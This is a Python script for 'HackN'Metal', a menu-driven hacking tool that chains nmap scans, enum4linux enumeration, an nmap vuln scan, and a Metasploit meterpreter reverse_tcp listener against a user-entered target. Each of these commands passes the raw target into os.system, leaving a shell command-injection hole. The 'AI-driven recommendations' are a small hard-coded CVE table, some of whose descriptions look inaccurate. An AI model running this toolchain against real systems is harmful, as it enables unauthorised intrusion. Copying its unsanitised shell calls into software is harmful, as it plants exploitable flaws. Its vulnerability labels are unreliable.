import os

# Display a disclaimer message for ethical use
def display_disclaimer():
    print("""
===============================================================
        HACKN'METAL - FOR RESEARCH AND EDUCATIONAL USE ONLY !
        
        This tool is designed to be used ONLY on systems
        you own or have explicit permission to test.
        Unauthorized hacking is illegal and unethical.
        
        Use responsibly and in compliance with all local laws.
===============================================================
    """)

# Header for HackN'Metal
def print_header():
    print(r"""
 _    _            _     _   _      __  __      _        _ 
| |  | |          (_)   | | | |    |  \/  |    | |      | |
| |__| | __ _ _ __ _ ___| |_| | ___| \  / | ___| |_ __ _| |
|  __  |/ _` | '__| / __| __| |/ _ \ |\/| |/ _ \ __/ _` | |
| |  | | (_| | |  | \__ \ |_| |  __/ |  | |  __/ || (_| | |
|_|  |_|\__,_|_|  |_|___/\__|_|\___|_|  |_|\___|\__\__,_|_|
----------------------------------------------------------
    """)

# Footer for HackN'Metal
def print_footer():
    print("""
-------------------------------------------------------
                Created with chaos by sleep33
-------------------------------------------------------
    """)

# Function for reconnaissance using nmap and saving the output
def reconnaissance(target):
    print(f"[+] Performing reconnaissance on {target}...")
    os.system(f"nmap -sV {target} -oN scan_results.txt")
    return "scan_results.txt"

# Example function for searching exploits based on service and version
def search_exploits(service, version):
    exploits = {
        "Apache": {
            "2.4.49": ["CVE-2021-41773", "Exploit for path traversal in Apache"],
            "2.4.50": ["CVE-2021-42013", "Remote Code Execution in Apache"]
        },
        "MySQL": {
            "5.7": ["CVE-2018-3282", "SQL Injection vulnerability in MySQL 5.7"]
        }
    }

    if service in exploits and version in exploits[service]:
        return exploits[service][version]
    return None

# AI-driven recommendations based on scan results
def ai_recommendations(scan_file):
    recommendations = []
    with open(scan_file, 'r') as f:
        for line in f:
            if "Apache" in line:
                version = line.split()[2]  # Assume Apache version is in the third column
                result = search_exploits("Apache", version)
                if result:
                    recommendations.append(f"[*] Found vulnerability in Apache {version}: {result[0]}")
                    recommendations.append(f"    {result[1]}")
            elif "MySQL" in line:
                version = line.split()[1]  # Assume MySQL version is in the second column
                result = search_exploits("MySQL", version)
                if result:
                    recommendations.append(f"[*] Found vulnerability in MySQL {version}: {result[0]}")
                    recommendations.append(f"    {result[1]}")

    if not recommendations:
        recommendations.append("[+] No known vulnerabilities found. You're in the clear... for now.")
    else:
        recommendations.append("[+] Further steps: Consider running an exploit or patching the vulnerable services.")
    
    return recommendations

# Function for port scanning and service discovery
def scanning(target):
    print("[+] Scanning ports harder than a Meshuggah riff... Hold tight!")
    os.system(f"nmap -sV {target}")

# Function for enumeration
def enumeration(target):
    print("[+] Enumerating services like a double kick drum — BOOM BOOM!")
    os.system(f"enum4linux {target}")

# Function for vulnerability scanning
def vulnerability_scanning(target):
    print("[+] Hunting for vulnerabilities like you're hunting down a lost vinyl... hardcore!")
    os.system(f"nmap --script vuln {target}")

# Function for exploiting vulnerabilities
def exploitation():
    print("[+] Time to f***ing exploit this! We're going full Metallica circa '86 on this system!")
    os.system("msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; exploit'")

# Function to run all tests at once
def run_all(target):
    print(f"[+] Grabbing {target} by the throat and running every f***ing test at once!")
    reconnaissance(target)
    scanning(target)
    enumeration(target)
    vulnerability_scanning(target)
    exploitation()

# Main menu display function
def show_menu():
    print("-----------------------------------")
    print("    HackN’Metal — Hacking with Attitude!")
    print("-----------------------------------")
    print("1. Reconnaissance (Dig Deep Like a Heavy Bassline)")
    print("2. Scanning (Ports are gonna tremble)")
    print("3. Enumeration (Find who’s playing what in this network jam)")
    print("4. Vulnerability Scanning (Someone here is weak as f***)")
    print("5. Exploitation (It’s time to destroy!)")
    print("6. Run All Tests (Cause you don’t have time for bullshit)")
    print("7. AI-Driven Recommendations")
    print("8. Exit and go blast some f***ing metal!")
    print("-----------------------------------")
    choice = input("Your move, badass. Pick something [1-8]: ")
    return choice

# Function to handle user choices
def handle_choice(choice, target):
    if choice == '1':
        reconnaissance(target)
    elif choice == '2':
        scanning(target)
    elif choice == '3':
        enumeration(target)
    elif choice == '4':
        vulnerability_scanning(target)
    elif choice == '5':
        exploitation()
    elif choice == '6':
        run_all(target)
    elif choice == '7':
        scan_file = reconnaissance(target)
        recommendations = ai_recommendations(scan_file)
        for recommendation in recommendations:
            print(recommendation)
    elif choice == '8':
        print("Alright, go crank up the metal and headbang yourself out of here!")
        exit(0)
    else:
        print("What the f*** are you doing? Pick a valid number, headbanger!")

# Main function
def main():
    display_disclaimer()  # Show disclaimer before running
    print_header()
    target = input("Enter the target to scan: ")
    
    while True:
        choice = show_menu()
        handle_choice(choice, target)
    
    print_footer()

if __name__ == "__main__":
    main()
